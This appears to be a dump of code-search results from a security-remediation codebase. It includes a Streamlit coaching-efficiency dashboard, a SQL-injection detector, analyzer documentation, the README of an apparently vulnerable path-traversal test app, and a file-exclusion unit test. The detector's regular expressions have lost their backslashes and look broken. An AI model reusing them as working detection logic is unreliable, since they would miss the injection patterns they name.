f'customers/{customer[\\"customer_id\\"]}/users/{agent_user_id}'","lineNumber":226},{"text":"    try:","lineNumber":227},{"text":"        request = analytics_service_pb2.RetrieveQAScoreStatsRequest(","lineNumber":228},{"text":"            parent=parent,","lineNumber":229},{"text":"            read_from_clickhouse=True,","lineNumber":230},{"text":"            filter_by_time_range=common_pb2.TimeRange(","lineNumber":231},{"text":"                start_timestamp=timestamp_pb2.Timestamp(seconds=int(start_time.timestamp()), ),","lineNumber":232},{"text":"                end_timestamp=timestamp_pb2.Timestamp(seconds=int(end_time.timestamp()), ),","lineNumber":233},{"text":"            ),","lineNumber":234},{"text":"            filter_by_attribute=qa_stats_pb2.QAAttribute(","lineNumber":235},{"text":"                    users=[user_pb2.User(name=agent_user_name)],","lineNumber":236},{"text":"                    criterion_identifiers=[criteria_id],","lineNumber":237},{"text":"                ),","lineNumber":238},{"text":"            group_by_attribute_types=[","lineNumber":239},{"text":"                qa_stats_pb2.QAAttributeType.QA_ATTRIBUTE_TYPE_CRITERION,","lineNumber":240},{"text":"            ],","lineNumber":241},{"text":"        )","lineNumber":242},{"text":"        response = _stub.RetrieveQAScoreStats(","lineNumber":243},{"text":"            request,","lineNumber":244},{"text":"            metadata=auth_metadata,","lineNumber":245},{"text":"            timeout=600)","lineNumber":246},{"text":"    except Exception as e:","lineNumber":247},{"text":"        print(f'Error querying Insights Server: {e}')","lineNumber":248},{"text":"        return None","lineNumber":249},{"text":"    if response.qa_score_result.total_conversation_count == 0:","lineNumber":250},{"text":"        return -1, 0","lineNumber":251},{"text":"    return response.qa_score_result.average_qa_score, response.qa_score_result.total_conversation_count","lineNumber":252},{"lineNumber":253},{"lineNumber":254},{"text":"##############################################################################################","lineNumber":255},{"lineNumber":256},{"text":"customer_display_name = st.selectbox(","lineNumber":257},{"text":"    'Select a customer:',","lineNumber":258},{"text":"    [c['display_name'] for c in all_customers])","lineNumber":259},{"lineNumber":260},{"text":"num_last_days = st.number_input(\\"How many days back to load the session notes?\\", min_value=7, max_value=180, value=30, step=1)","lineNumber":261},{"lineNumber":262},{"text":"num_days = st.number_input(\\"How many days to measure the session efficiency?\\", min_value=1, max_value=30, value=7, step=1)","lineNumber":263},{"lineNumber":264},{"text":"coaching_sessions = load_coaching_data(customer_display_name, num_last_days, num_days)","lineNumber":265},{"lineNumber":266},{"text":"coaching_sessions = load_scores_data(customer_display_name, coaching_sessions, num_days)","lineNumber":267},{"lineNumber":268},{"text":"with st.expander(\\"All loaded session notes\\", expanded=True):","lineNumber":269},{"text":"    st.write(f\\"Loaded {len(coaching_sessions)} coaching sessions in total\\")","lineNumber":270},{"text":"    session_df = pd.DataFrame(coaching_sessions)","lineNumber":271},{"text":"    st.dataframe(session_df)","lineNumber":272},{"text":"    st.write(f\\"Loaded {len(session_df['session_id'].unique())} coaching sessions in { len(session_df['coaching_plan_id'].unique()) } coaching plans.\\")","lineNumber":273},{"text":"    # session_df.to_csv('coaching_sessions.csv', index=False)  # Set index=False to omit row numbers","lineNumber":274},{"lineNumber":275},{"text":"with st.expander(\\"Session notes with valid scores\\", expanded=True):","lineNumber":276},{"text":"    # Coach efficiency chart.","lineNumber":277},{"text":"    valid_session_df = session_df[(session_df['before_score'] >= 0) & (session_df['after_score'] >= 0)].reset_index()","lineNumber":278},{"text":"    st.dataframe(valid_session_df)","lineNumber":279},{"text":" ","lineNumber":280},{"text":"    session_with_criteria_df = session_df[session_df['focus_criteria_id'] != '']","lineNumber":281},{"text":"    st.write(f\\"Loaded {len(session_with_criteria_df['session_id'].unique())} coaching sessions with focus criteria in the coaching plan.\\")","lineNumber":282},{"text":"    st.write(f\\"Loaded {len(valid_session_df['session_id'].unique())} coaching sessions with valid performance scores computed.\\")","lineNumber":283},{"lineNumber":284},{"text":"def weighted_effiency(df):","lineNumber":285},{"text":"    efficiency = ((df['after_score'] - df['before_score']) * df['after_convo_count']).sum() / df['after_convo_count'].sum()","lineNumber":286},{"text":"    num_sessions =  len(df['session_id'].unique())","lineNumber":287},{"text":"    return pd.Series({","lineNumber":288},{"text":"        'efficiency': efficiency,","lineNumber":289},{"text":"        'num_sessions': num_sessions","lineNumber":290},{"text":"    })","lineNumber":291},{"lineNumber":292},{"text":"with st.expander(\\"Session efficiency\\", expanded=True):","lineNumber":293},{"text":"    session_efficiency_df = valid_session_df.groupby('session_id').apply(weighted_effiency).reset_index()","lineNumber":294},{"text":"    session_efficiency_df.columns = ['Session id', 'Efficiency', 'Number of Sessions']","lineNumber":295},{"text":"    st.dataframe(session_efficiency_df)","lineNumber":296},{"text":"    fig = px.histogram(session_efficiency_df, x=\\"Efficiency\\", nbins=100)","lineNumber":297},{"text":"    st.plotly_chart(fig, theme=\\"streamlit\\")","lineNumber":298},{"lineNumber":299},{"text":"with st.expander(\\"Coaching plan efficiency\\", expanded=True):","lineNumber":300},{"text":"    plan_efficiency_df = valid_session_df.groupby('coaching_plan_id').apply(weighted_effiency).reset_index()","lineNumber":301},{"text":"    plan_efficiency_df.columns = ['Coach Plan', 'Efficiency', 'Number of Sessions']","lineNumber":302},{"text":"    st.dataframe(plan_efficiency_df)","lineNumber":303},{"text":"    fig = px.histogram(plan_efficiency_df, x=\\"Efficiency\\", nbins=100)","lineNumber":304},{"text":"    st.plotly_chart(fig, theme=\\"streamlit\\")","lineNumber":305},{"lineNumber":306},{"text":"with st.expander(\\"Focus criteria efficiency\\", expanded=True):","lineNumber":307},{"text":"    criteria_efficiency_df = valid_session_df.groupby('focus_criteria').apply(weighted_effiency).reset_index()","lineNumber":308},{"text":"    criteria_efficiency_df.columns = ['Focus Criteria', 'Efficiency', 'Number of Sessions']","lineNumber":309},{"text":"    st.dataframe(criteria_efficiency_df)","lineNumber":310},{"text":"    fig = px.histogram(criteria_efficiency_df, x=\\"Efficiency\\", nbins=100)","lineNumber":311},{"text":"    st.plotly_chart(fig, theme=\\"streamlit\\")","lineNumber":312},{"lineNumber":313},{"text":"with st.expander(\\"Focus scorecard template efficiency\\", expanded=True):","lineNumber":314},{"text":"    template_efficiency_df = valid_session_df.groupby('focus_criteria_template').apply(weighted_effiency).reset_index()","lineNumber":315},{"text":"    template_efficiency_df.columns = ['Focus Scorecard Template', 'Efficiency', 'Number of Sessions']","lineNumber":316},{"text":"    st.dataframe(template_efficiency_df)","lineNumber":317},{"text":"    fig = px.histogram(template_efficiency_df, x=\\"Efficiency\\", nbins=100)","lineNumber":318},{"text":"    st.plotly_chart(fig, theme=\\"streamlit\\")","lineNumber":319},{"lineNumber":320},{"text":"with st.expander(\\"Coach efficiency\\", expanded=True):","lineNumber":321},{"text":"    coach_efficiency_df = valid_session_df.groupby('creator_user_name').apply(weighted_effiency).reset_index()","lineNumber":322},{"text":"    coach_efficiency_df.columns = ['Coach', 'Efficiency', 'Number of Sessions']","lineNumber":323},{"text":"    st.dataframe(coach_efficiency_df)","lineNumber":324},{"text":"    st.scatter_chart(data=coach_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')","lineNumber":325},{"lineNumber":326},{"text":"with st.expander(\\"Agent efficiency\\", expanded=True):","lineNumber":327},{"text":"    # Agent efficiency chart.","lineNumber":328},{"text":"    agent_efficiency_df = valid_session_df.groupby('agent_user_name').apply(weighted_effiency).reset_index()","lineNumber":329},{"text":"    agent_efficiency_df.columns = ['Agent', 'Efficiency', 'Number of Sessions']","lineNumber":330},{"text":"    st.dataframe(agent_efficiency_df)","lineNumber":331},{"text":"    st.scatter_chart(data=agent_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')","lineNumber":332},{"text":"\`","lineNumber":333},{"lineNumber":334},{"lineNumber":335},{"text":"export const processingFunction = \`","lineNumber":336},{"text":"function analyzeCodeForSQLInjection(code) {","lineNumber":337},{"text":"  // Regular expressions to detect SQL Injection vulnerabilities","lineNumber":338},{"text":"  const patterns = [","lineNumber":339},{"text":"    /\\b(executeQuery|executeUpdate)s*(s*.*+.*)/i,","lineNumber":340},{"text":"    /\\bStatements+.*=s+.*.createStatement()/i,","lineNumber":341},{"text":"    /[\\"']s*+s*w+s*+s*[\\"']/i","lineNumber":342},{"text":"  ];","lineNumber":343},{"lineNumber":344},{"text":"  // Check if code matches any vulnerable patterns","lineNumber":345},{"text":"  const vulnerabilities = patterns.reduce((issues, pattern) => {","lineNumber":346},{"text":"    if (pattern.test(code)) {","lineNumber":347},{"text":"      issues.push({","lineNumber":348},{"text":"        type: \\"SQL Injection\\",","lineNumber":349},{"text":"        severity: calculateSeverity(code),","lineNumber":350},{"text":"        location: findVulnerableLocation(code, pattern)","lineNumber":351},{"text":"      });","lineNumber":352},{"text":"    }","lineNumber":353},{"text":"    return issues;","lineNumber":354},{"text":"  }, []);","lineNumber":355},{"lineNumber":356},{"text":"  return {","lineNumber":357},{"text":"    issues: vulnerabilities,","lineNumber":358},{"text":"    summary: generateSummary(vulnerabilities),","lineNumber":359},{"text":"    hasCritical: vulnerabilities.some(v => v.severity === \\"Critical\\")","lineNumber":360},{"text":"  };","lineNumber":361},{"text":"}","lineNumber":362},{"text":"\`;","lineNumber":363}]},"score":0.29074323177337646},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/README.md","range":{"startPosition":{},"endPosition":{"line":45}},"contents":"# Analyzer\\n\\nAnalyzer is the main Mobb component responsible for matching SAST vulnerabilities and customer source code and producing the fixes.\\n\\n## Useful commands\\n\\n- \`make test\` or \`make test-watch\` to run all test.\\n- \`make test-snapshot\` to update snapshots for all tests after code changes. Please review snapshots before committing changes.\\n- \`make codestyle\` to ensure code formatting. It is required before committing changes.\\n- \`poetry run python analyzer/start_analyzer.py\` to run the analyzer locally (outside of Docker environment). RabbitMQ required.\\n\\n## \`analyzer/fixes\` folder structure\\n\\nAll logic is stored in the nested folder structure: language (e.g., java/js/csharp) -> vulnerability type (e.g., pt/cmdi/xss).\\n\\nIn each folder, we have several files. They are loaded dynamically. Hence, names should be preserved.\\n\\n### \`types.py\`\\n\\nThis file contains dataclasses, which are used to communicate between \`analyzer.py\`, \`parser.py\`, and \`fixer.py\`.\\n\\nIt usually defines the child class of the \`FixInfo\` class, which is eventually stored as a Pickle file in S3 and used by \`interactive_fixer\` to produce a fix.\\n\\nThe \`FixInfo\` may optionally define \`get_questions\` function, which is responsible for the fix questions presented to the user.\\n\\n### \`parser.py\`\\n\\n\`parser.py\` is responsible for parsing customer source code and extracting information used later in \`analyzer.py\`.\\n\\nThis is the only place where AST manipulation is allowed. E.g., we can use \`execute_semgrep\` and \`execute_treesitter\` only in this file.\\n\\n### \`treesitter_rules\` folder\\n\\nThis folder contains \`lisp\` rule files. They are used by Tree-sitter to extract specific AST nodes.\\n\\nThe rule file name should be unique and in the shape of: \`meaning.language.lisp\` (for example, \`get_java_comments.java.lisp\`).\\n\\nUseful links:\\n\\n- Rules playground: https://tree-sitter.github.io/tree-sitter/playground\\n- Documentation: https://tree-sitter.github.io/tree-sitter/using-parsers#query-syntax\\n\\n### \`semgrep_rules\` folder\\n\\n","originalContents":"# Analyzer\\n\\nAnalyzer is the main Mobb component responsible for matching SAST vulnerabilities and customer source code and producing the fixes.\\n\\n## Useful commands\\n\\n- \`make test\` or \`make test-watch\` to run all test.\\n- \`make test-snapshot\` to update snapshots for all tests after code changes. Please review snapshots before committing changes.\\n- \`make codestyle\` to ensure code formatting. It is required before committing changes.\\n- \`poetry run python analyzer/start_analyzer.py\` to run the analyzer locally (outside of Docker environment). RabbitMQ required.\\n\\n## \`analyzer/fixes\` folder structure\\n\\nAll logic is stored in the nested folder structure: language (e.g., java/js/csharp) -> vulnerability type (e.g., pt/cmdi/xss).\\n\\nIn each folder, we have several files. They are loaded dynamically. Hence, names should be preserved.\\n\\n### \`types.py\`\\n\\nThis file contains dataclasses, which are used to communicate between \`analyzer.py\`, \`parser.py\`, and \`fixer.py\`.\\n\\nIt usually defines the child class of the \`FixInfo\` class, which is eventually stored as a Pickle file in S3 and used by \`interactive_fixer\` to produce a fix.\\n\\nThe \`FixInfo\` may optionally define \`get_questions\` function, which is responsible for the fix questions presented to the user.\\n\\n### \`parser.py\`\\n\\n\`parser.py\` is responsible for parsing customer source code and extracting information used later in \`analyzer.py\`.\\n\\nThis is the only place where AST manipulation is allowed. E.g., we can use \`execute_semgrep\` and \`execute_treesitter\` only in this file.\\n\\n### \`treesitter_rules\` folder\\n\\nThis folder contains \`lisp\` rule files. They are used by Tree-sitter to extract specific AST nodes.\\n\\nThe rule file name should be unique and in the shape of: \`meaning.language.lisp\` (for example, \`get_java_comments.java.lisp\`).\\n\\nUseful links:\\n\\n- Rules playground: https://tree-sitter.github.io/tree-sitter/playground\\n- Documentation: https://tree-sitter.github.io/tree-sitter/using-parsers#query-syntax\\n\\n### \`semgrep_rules\` folder\\n\\n","detailedLines":[{"text":"# Analyzer","lineNumber":1},{"lineNumber":2},{"text":"Analyzer is the main Mobb component responsible for matching SAST vulnerabilities and customer source code and producing the fixes.","lineNumber":3},{"lineNumber":4},{"text":"## Useful commands","lineNumber":5},{"lineNumber":6},{"text":"- \`make test\` or \`make test-watch\` to run all test.","lineNumber":7},{"text":"- \`make test-snapshot\` to update snapshots for all tests after code changes. Please review snapshots before committing changes.","lineNumber":8},{"text":"- \`make codestyle\` to ensure code formatting. It is required before committing changes.","lineNumber":9},{"text":"- \`poetry run python analyzer/start_analyzer.py\` to run the analyzer locally (outside of Docker environment). RabbitMQ required.","lineNumber":10},{"lineNumber":11},{"text":"## \`analyzer/fixes\` folder structure","lineNumber":12},{"lineNumber":13},{"text":"All logic is stored in the nested folder structure: language (e.g., java/js/csharp) -> vulnerability type (e.g., pt/cmdi/xss).","lineNumber":14},{"lineNumber":15},{"text":"In each folder, we have several files. They are loaded dynamically. Hence, names should be preserved.","lineNumber":16},{"lineNumber":17},{"text":"### \`types.py\`","lineNumber":18},{"lineNumber":19},{"text":"This file contains dataclasses, which are used to communicate between \`analyzer.py\`, \`parser.py\`, and \`fixer.py\`.","lineNumber":20},{"lineNumber":21},{"text":"It usually defines the child class of the \`FixInfo\` class, which is eventually stored as a Pickle file in S3 and used by \`interactive_fixer\` to produce a fix.","lineNumber":22},{"lineNumber":23},{"text":"The \`FixInfo\` may optionally define \`get_questions\` function, which is responsible for the fix questions presented to the user.","lineNumber":24},{"lineNumber":25},{"text":"### \`parser.py\`","lineNumber":26},{"lineNumber":27},{"text":"\`parser.py\` is responsible for parsing customer source code and extracting information used later in \`analyzer.py\`.","lineNumber":28},{"lineNumber":29},{"text":"This is the only place where AST manipulation is allowed. E.g., we can use \`execute_semgrep\` and \`execute_treesitter\` only in this file.","lineNumber":30},{"lineNumber":31},{"text":"### \`treesitter_rules\` folder","lineNumber":32},{"lineNumber":33},{"text":"This folder contains \`lisp\` rule files. They are used by Tree-sitter to extract specific AST nodes.","lineNumber":34},{"lineNumber":35},{"text":"The rule file name should be unique and in the shape of: \`meaning.language.lisp\` (for example, \`get_java_comments.java.lisp\`).","lineNumber":36},{"lineNumber":37},{"text":"Useful links:","lineNumber":38},{"lineNumber":39},{"text":"- Rules playground: https://tree-sitter.github.io/tree-sitter/playground","lineNumber":40},{"text":"- Documentation: https://tree-sitter.github.io/tree-sitter/using-parsers#query-syntax","lineNumber":41},{"lineNumber":42},{"text":"### \`semgrep_rules\` folder","lineNumber":43},{"lineNumber":44},{"text":"Contains \`yml\` rules used by Semgrep. The rule file name should be unique.","lineNumber":45}]},"score":0.2902885973453522},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/java/pt/e-1488/source/README.md","range":{"startPosition":{"line":76},"endPosition":{"line":160}},"contents":"- **Response**: JSON with file metadata (size, last modified)\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl \\"http://localhost:8080/api/files/info?filename={filename}\\"\\n\`\`\`\\n\\n## Configuration\\n\\nThe application can be configured through \`src/main/resources/application.properties\`:\\n\\n- \`server.port\`: Server port (default: 8080)\\n- \`spring.servlet.multipart.max-file-size\`: Maximum file size (default: 10MB)\\n- \`spring.servlet.multipart.max-request-size\`: Maximum request size (default: 10MB)\\n\\n## File Storage\\n\\nFiles are stored in the \`uploads/\` directory in the application's working directory. Each file is given a unique UUID-based filename to prevent conflicts.\\n\\n## Security Considerations\\n\\nThis is a simple demo application. For production use, consider implementing:\\n\\n- Authentication and authorization\\n- File type validation\\n- Virus scanning\\n- Rate limiting\\n- Secure file storage (e.g., cloud storage)\\n- Input validation and sanitization\\n\\n## Error Handling\\n\\nThe API returns appropriate HTTP status codes:\\n\\n- \`200 OK\`: Successful operation\\n- \`400 Bad Request\`: Invalid input or file not found\\n- \`404 Not Found\`: File not found\\n- \`500 Internal Server Error\`: Server error\\n\\n## Development\\n\\n### Project Structure\\n\\n\`\`\`\\nsrc/\\n├── main/\\n│   ├── java/\\n│   │   └── com/example/fileapi/\\n│   │       ├── FileApiApplication.java\\n│   │       ├── controller/\\n│   │       │   └── FileController.java\\n│   │       └── service/\\n│   │           └── FileService.java\\n│   └── resources/\\n│       ├── application.properties\\n│       └── static/\\n│           └── index.html\\n└── test/\\n    └── java/\\n        └── com/example/fileapi/\\n            └── FileApiApplicationTests.java\\n\`\`\`\\n\\n### Running Tests\\n\\n\`\`\`bash\\nmvn test\\n\`\`\`\\n\\n### Building JAR\\n\\n\`\`\`bash\\nmvn clean package\\n\`\`\`\\n\\nThe executable JAR will be created in the \`target/\` directory.\\n\\n## License\\n\\n","originalContents":"- **Response**: JSON with file metadata (size, last modified)\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl \\"http://localhost:8080/api/files/info?filename={filename}\\"\\n\`\`\`\\n\\n## Configuration\\n\\nThe application can be configured through \`src/main/resources/application.properties\`:\\n\\n- \`server.port\`: Server port (default: 8080)\\n- \`spring.servlet.multipart.max-file-size\`: Maximum file size (default: 10MB)\\n- \`spring.servlet.multipart.max-request-size\`: Maximum request size (default: 10MB)\\n\\n## File Storage\\n\\nFiles are stored in the \`uploads/\` directory in the application's working directory. Each file is given a unique UUID-based filename to prevent conflicts.\\n\\n## Security Considerations\\n\\nThis is a simple demo application. For production use, consider implementing:\\n\\n- Authentication and authorization\\n- File type validation\\n- Virus scanning\\n- Rate limiting\\n- Secure file storage (e.g., cloud storage)\\n- Input validation and sanitization\\n\\n## Error Handling\\n\\nThe API returns appropriate HTTP status codes:\\n\\n- \`200 OK\`: Successful operation\\n- \`400 Bad Request\`: Invalid input or file not found\\n- \`404 Not Found\`: File not found\\n- \`500 Internal Server Error\`: Server error\\n\\n## Development\\n\\n### Project Structure\\n\\n\`\`\`\\nsrc/\\n├── main/\\n│   ├── java/\\n│   │   └── com/example/fileapi/\\n│   │       ├── FileApiApplication.java\\n│   │       ├── controller/\\n│   │       │   └── FileController.java\\n│   │       └── service/\\n│   │           └── FileService.java\\n│   └── resources/\\n│       ├── application.properties\\n│       └── static/\\n│           └── index.html\\n└── test/\\n    └── java/\\n        └── com/example/fileapi/\\n            └── FileApiApplicationTests.java\\n\`\`\`\\n\\n### Running Tests\\n\\n\`\`\`bash\\nmvn test\\n\`\`\`\\n\\n### Building JAR\\n\\n\`\`\`bash\\nmvn clean package\\n\`\`\`\\n\\nThe executable JAR will be created in the \`target/\` directory.\\n\\n## License\\n\\n","detailedLines":[{"text":"\`\`\`","lineNumber":77},{"lineNumber":78},{"text":"### Get File Information","lineNumber":79},{"text":"- **URL**: \`GET /api/files/info?filename={filename}\`","lineNumber":80},{"text":"- **Response**: JSON with file metadata (size, last modified)","lineNumber":81},{"lineNumber":82},{"text":"**Example using curl:**","lineNumber":83},{"text":"\`\`\`bash","lineNumber":84},{"text":"curl \\"http://localhost:8080/api/files/info?filename={filename}\\"","lineNumber":85},{"text":"\`\`\`","lineNumber":86},{"lineNumber":87},{"text":"## Configuration","lineNumber":88},{"lineNumber":89},{"text":"The application can be configured through \`src/main/resources/application.properties\`:","lineNumber":90},{"lineNumber":91},{"text":"- \`server.port\`: Server port (default: 8080)","lineNumber":92},{"text":"- \`spring.servlet.multipart.max-file-size\`: Maximum file size (default: 10MB)","lineNumber":93},{"text":"- \`spring.servlet.multipart.max-request-size\`: Maximum request size (default: 10MB)","lineNumber":94},{"lineNumber":95},{"text":"## File Storage","lineNumber":96},{"lineNumber":97},{"text":"Files are stored in the \`uploads/\` directory in the application's working directory. Each file is given a unique UUID-based filename to prevent conflicts.","lineNumber":98},{"lineNumber":99},{"text":"## Security Considerations","lineNumber":100},{"lineNumber":101},{"text":"This is a simple demo application. For production use, consider implementing:","lineNumber":102},{"lineNumber":103},{"text":"- Authentication and authorization","lineNumber":104},{"text":"- File type validation","lineNumber":105},{"text":"- Virus scanning","lineNumber":106},{"text":"- Rate limiting","lineNumber":107},{"text":"- Secure file storage (e.g., cloud storage)","lineNumber":108},{"text":"- Input validation and sanitization","lineNumber":109},{"lineNumber":110},{"text":"## Error Handling","lineNumber":111},{"lineNumber":112},{"text":"The API returns appropriate HTTP status codes:","lineNumber":113},{"lineNumber":114},{"text":"- \`200 OK\`: Successful operation","lineNumber":115},{"text":"- \`400 Bad Request\`: Invalid input or file not found","lineNumber":116},{"text":"- \`404 Not Found\`: File not found","lineNumber":117},{"text":"- \`500 Internal Server Error\`: Server error","lineNumber":118},{"lineNumber":119},{"text":"## Development","lineNumber":120},{"lineNumber":121},{"text":"### Project Structure","lineNumber":122},{"lineNumber":123},{"text":"\`\`\`","lineNumber":124},{"text":"src/","lineNumber":125},{"text":"├── main/","lineNumber":126},{"text":"│   ├── java/","lineNumber":127},{"text":"│   │   └── com/example/fileapi/","lineNumber":128},{"text":"│   │       ├── FileApiApplication.java","lineNumber":129},{"text":"│   │       ├── controller/","lineNumber":130},{"text":"│   │       │   └── FileController.java","lineNumber":131},{"text":"│   │       └── service/","lineNumber":132},{"text":"│   │           └── FileService.java","lineNumber":133},{"text":"│   └── resources/","lineNumber":134},{"text":"│       ├── application.properties","lineNumber":135},{"text":"│       └── static/","lineNumber":136},{"text":"│           └── index.html","lineNumber":137},{"text":"└── test/","lineNumber":138},{"text":"    └── java/","lineNumber":139},{"text":"        └── com/example/fileapi/","lineNumber":140},{"text":"            └── FileApiApplicationTests.java","lineNumber":141},{"text":"\`\`\`","lineNumber":142},{"lineNumber":143},{"text":"### Running Tests","lineNumber":144},{"lineNumber":145},{"text":"\`\`\`bash","lineNumber":146},{"text":"mvn test","lineNumber":147},{"text":"\`\`\`","lineNumber":148},{"lineNumber":149},{"text":"### Building JAR","lineNumber":150},{"lineNumber":151},{"text":"\`\`\`bash","lineNumber":152},{"text":"mvn clean package","lineNumber":153},{"text":"\`\`\`","lineNumber":154},{"lineNumber":155},{"text":"The executable JAR will be created in the \`target/\` directory.","lineNumber":156},{"lineNumber":157},{"text":"## License","lineNumber":158},{"lineNumber":159},{"text":"This project is open source and available under the MIT License. ","lineNumber":160}]},"score":0.288938045501709},{"codeBlock":{"relativeWorkspacePath":"clients/cli/__tests__/mcp/fileUtils.unit.test.ts","range":{"startPosition":{"line":16,"column":3},"endPosition":{"line":1261,"column":1}},"contents":"\\n...\\ndescribe('FileUtils', () => {\\n  ...\\n  describe('isExcludedFileType', () => {\\n\\n\\n    ...\\n\\n\\n    it('should comprehensively test all EXCLUDED_FILE_PATTERNS', () => {\\n      // Test ALL patterns from EXCLUDED_FILE_PATTERNS\\n      const excludedFiles = [\\n        // Snapshot and environment files\\n        'test.snap',\\n        'secrets.env.vault',\\n        '.env',\\n        // Configuration formats not supported for analysis\\n        'config.toml',\\n        'app.ini',\\n        'server.conf',\\n        'settings.config',\\n        // Documentation files\\n        'README.md',\\n        'notes.txt',\\n        'guide.rst',\\n        'manual.adoc',\\n        // Lock files (except important project ones handled separately)\\n        'some.lock', // Note: yarn.lock, package-lock.json etc. are IMPORTANT_PROJECT_FILES\\n        // Image and media files\\n        'logo.png',\\n        'photo.jpg',\\n        'image.jpeg',\\n        'animation.gif',\\n        'favicon.ico',\\n        'banner.webp',\\n        'texture.bmp',\\n        'print.tiff',\\n        // Font files\\n        'font.ttf',\\n        'typeface.otf',\\n        'web.woff',\\n        'modern.woff2',\\n        'legacy.eot',\\n        // Archive files\\n        'backup.zip',\\n        'archive.tar',\\n        'compressed.gz',\\n        'files.rar',\\n        'data.7z',\\n        // Log and database files\\n        'app.log',\\n        'data.db',\\n        'cache.sqlite',\\n        'schema.sql',\\n        // Certificate and key files\\n        'cert.pem',\\n        'ssl.crt',\\n        'private.key',\\n        'identity.p12',\\n        'cert.pfx',\\n        // Editor and system files\\n        '.editorconfig',\\n        'project.sublime-project',\\n        'workspace.sublime-workspace',\\n        '.DS_Store',\\n        'Thumbs.db',\\n        // Coverage and build artifacts\\n        'coverage.lcov',\\n        'app.exe',\\n        'library.dll',\\n        'libmath.so',\\n        'framework.dylib',\\n        'Main.class',\\n        'module.pyc',\\n        'cache.pyo',\\n        'object.o',\\n        'binary.obj',\\n        // Minified and bundled files (even with supported extensions)\\n        'jquery.min.js',\\n        'bootstrap.min.css'","originalContents":"\\n\\n    it('should comprehensively test all EXCLUDED_FILE_PATTERNS', () => {\\n      // Test ALL patterns from EXCLUDED_FILE_PATTERNS\\n      const excludedFiles = [\\n        // Snapshot and environment files\\n        'test.snap',\\n        'secrets.env.vault',\\n        '.env',\\n        // Configuration formats not supported for analysis\\n        'config.toml',\\n        'app.ini',\\n        'server.conf',\\n        'settings.config',\\n        // Documentation files\\n        'README.md',\\n        'notes.txt',\\n        'guide.rst',\\n        'manual.adoc',\\n        // Lock files (except important project ones handled separately)\\n        'some.lock', // Note: yarn.lock, package-lock.json etc. are IMPORTANT_PROJECT_FILES\\n        // Image and media files\\n        'logo.png',\\n        'photo.jpg',\\n        'image.jpeg',\\n        'animation.gif',\\n        'favicon.ico',\\n        'banner.webp',\\n        'texture.bmp',\\n        'print.tiff',\\n        // Font files\\n        'font.ttf',\\n        'typeface.otf',\\n        'web.woff',\\n        'modern.woff2',\\n        'legacy.eot',\\n        // Archive files\\n        'backup.zip',\\n        'archive.tar',\\n        'compressed.gz',\\n        'files.rar',\\n        'data.7z',\\n        // Log and database files\\n        'app.log',\\n        'data.db',\\n        'cache.sqlite',\\n        'schema.sql',\\n        // Certificate and key files\\n        'cert.pem',\\n        'ssl.crt',\\n        'private.key',\\n        'identity.p12',\\n        'cert.pfx',\\n        // Editor and system files\\n        '.editorconfig',\\n        'project.sublime-project',\\n        'workspace.sublime-workspace',\\n        '.DS_Store',\\n        'Thumbs.db',\\n        // Coverage and build artifacts\\n        'coverage.lcov',\\n        'app.exe',\\n        'library.dll',\\n        'libmath.so',\\n        'framework.dylib',\\n        'Main.class',\\n        'module.pyc',\\n        'cache.pyo',\\n        'object.o',\\n        'binary.obj',\\n        // Minified and bundled files (even with supported extensions)\\n        'jquery.min.js',\\n        'bootstrap.min.css'","detailedLines":[{"text":"describe('FileUtils', () => {","lineNumber":19},{"text":"  let mockRepo: MockRepo","lineNumber":20},{"lineNumber":29},{"lineNumber":30},{"text":"  describe('isExcludedFileType', () => {","lineNumber":31},{"text":"    it","lineNumber":32},{"lineNumber":36},{"text":"() => {","lineNumber":76},{"text":" {","lineNumber":207},{"text":"        expect(FileUtils.isExcludedFileType(file)).toBe(false)","lineNumber":208},{"text":"      }","lineNumber":209},{"text":"    })","lineNumber":210},{"lineNumber":211},{"text":"    it('should comprehensively test all EXCLUDED_FILE_PATTERNS', () => {","lineNumber":212},{"text":"      // Test ALL patterns from EXCLUDED_FILE_PATTERNS","lineNumber":213},{"text":"      const excludedFiles = [","lineNumber":214},{"text":"        // Snapshot and environment files","lineNumber":215},{"text":"        'test.snap',","lineNumber":216},{"text":"        'secrets.env.vault',","lineNumber":217},{"text":"        '.env',","lineNumber":218},{"text":"        // Configuration formats not supported for analysis","lineNumber":219},{"text":"        'config.toml',","lineNumber":220},{"text":"        'app.ini',","lineNumber":221},{"text":"        'server.conf',","lineNumber":222},{"text":"        'settings.config',","lineNumber":223},{"text":"        // Documentation files","lineNumber":224},{"text":"        'README.md',","lineNumber":225},{"text":"        'notes.txt',","lineNumber":226},{"text":"        'guide.rst',","lineNumber":227},{"text":"        'manual.adoc',","lineNumber":228},{"text":"        // Lock files (except important project ones handled separately)","lineNumber":229},{"text":"        'some.lock', // Note: yarn.lock, package-lock.json etc. are IMPORTANT_PROJECT_FILES","lineNumber":230},{"text":"        // Image and media files","lineNumber":231},{"text":"        'logo.png',","lineNumber":232},{"text":"        'photo.jpg',","lineNumber":233},{"text":"        'image.jpeg',","lineNumber":234},{"text":"        'animation.gif',","lineNumber":235},{"text":"        'favicon.ico',","lineNumber":236},{"text":"        'banner.webp',","lineNumber":237},{"text":"        'texture.bmp',","lineNumber":238},{"text":"        'print.tiff',","lineNumber":239},{"text":"        // Font files","lineNumber":240},{"text":"        'font.ttf',","lineNumber":241},{"text":"        'typeface.otf',","lineNumber":242},{"text":"        'web.woff',","lineNumber":243},{"text":"        'modern.woff2',","lineNumber":244},{"text":"        'legacy.eot',","lineNumber":245},{"text":"        // Archive files","lineNumber":246},{"text":"        'backup.zip',","lineNumber":247},{"text":"        'archive.tar',","lineNumber":248},{"text":"        'compressed.gz',","lineNumber":249},{"text":"        'files.rar',","lineNumber":250},{"text":"        'data.7z',","lineNumber":251},{"text":"        // Log and database files","lineNumber":252},{"text":"        'app.log',","lineNumber":253},{"text":"        'data.db',","lineNumber":254},{"text":"        'cache.sqlite',","lineNumber":255},{"text":"        'schema.sql',","lineNumber":256},{"text":"        // Certificate and key files","lineNumber":257},{"text":"        'cert.pem',","lineNumber":258},{"text":"        'ssl.crt',","lineNumber":259},{"text":"        'private.key',","lineNumber":260},{"text":"        'identity.p12',","lineNumber":261},{"text":"        'cert.pfx',","lineNumber":262},{"text":"        // Editor and system files","lineNumber":263},{"text":"        '.editorconfig',","lineNumber":264},{"text":"     